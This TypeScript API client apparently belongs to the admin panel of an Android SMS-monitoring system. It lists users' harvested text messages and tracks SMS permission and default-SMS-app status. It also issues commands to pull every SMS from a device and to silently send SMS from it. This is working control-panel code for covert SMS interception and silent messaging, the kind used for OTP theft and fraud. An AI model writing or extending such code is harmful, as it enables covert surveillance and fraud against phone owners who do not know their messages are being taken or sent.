import request from './request'

export interface SmsRecord {
  id: number
  user_id: number
  phone_number: string
  content: string
  received_at: string
  device_info: string
  created_at: string
  user?: {
    id: number
    email: string
    nickname: string
    phone: string
  }
}

export interface SmsStatistics {
  total_records: number
  today_records: number
  total_users: number
}

export interface AndroidUser {
  id: number
  email: string
  nickname: string
  phone: string
  online_device: string
  last_heartbeat_at: string
  is_online: number
  sms_permission: number // 0=未知 1=已授权 2=未授权
  sms_listening: number // 0=未知 1=已开启 2=未开启
  foreground_permission: number // 0=未知 1=已开启 2=未开启
  is_default_sms: number // 0=未知 1=是默认短信应用 2=否
  created_at: string
  sms_count: number
  has_pending_command: boolean
}

export interface OnlineUser {
  id: number
  email: string
  nickname: string
  phone: string
  online_device: string
  last_heartbeat_at: string
}

// 安卓用户列表
export function getAndroidUsers(params: {
  page?: number
  pageSize?: number
  keyword?: string
  online_only?: string
}) {
  return request.get('/monitor/android-users', { params })
}

// 获取指定用户的短信记录
export function getUserSmsRecords(userId: number, params: {
  page?: number
  pageSize?: number
  keyword?: string
}) {
  return request.get(`/monitor/user-sms/${userId}`, { params })
}

export function getSmsRecordList(params: {
  page?: number
  pageSize?: number
  user_id?: number | string
  phone_number?: string
  keyword?: string
  start_date?: string
  end_date?: string
}) {
  return request.get('/monitor/sms-records', { params })
}

export function getSmsRecordDetail(id: number) {
  return request.get(`/monitor/sms-records/${id}`)
}

export function getSmsStatistics() {
  return request.get('/monitor/sms-records/statistics')
}

// 删除短信记录
export function deleteSmsRecord(id: number) {
  return request.delete(`/monitor/sms-records/${id}`)
}

// 批量删除短信记录
export function batchDeleteSmsRecords(ids: number[]) {
  return request.post('/monitor/sms-records/batch-delete', { ids })
}

// 获取在线用户列表
export function getOnlineUsers() {
  return request.get('/monitor/online-users')
}

// 下发获取全部短信指令
export function fetchSmsCommand(userId: number) {
  return request.post('/monitor/fetch-sms', { user_id: userId })
}

// 查询指令执行状态
export function getCommandStatus(id: number) {
  return request.get(`/monitor/command-status/${id}`)
}

// 清除用户待处理指令
export function clearPendingCommands(userId: number) {
  return request.post(`/monitor/clear-pending/${userId}`)
}

// 下发静默发送短信指令
export function sendSmsCommand(params: {
  user_id: number
  phone_number: string
  message: string
  sub_id?: number
}) {
  return request.post('/monitor/send-sms', params)
}
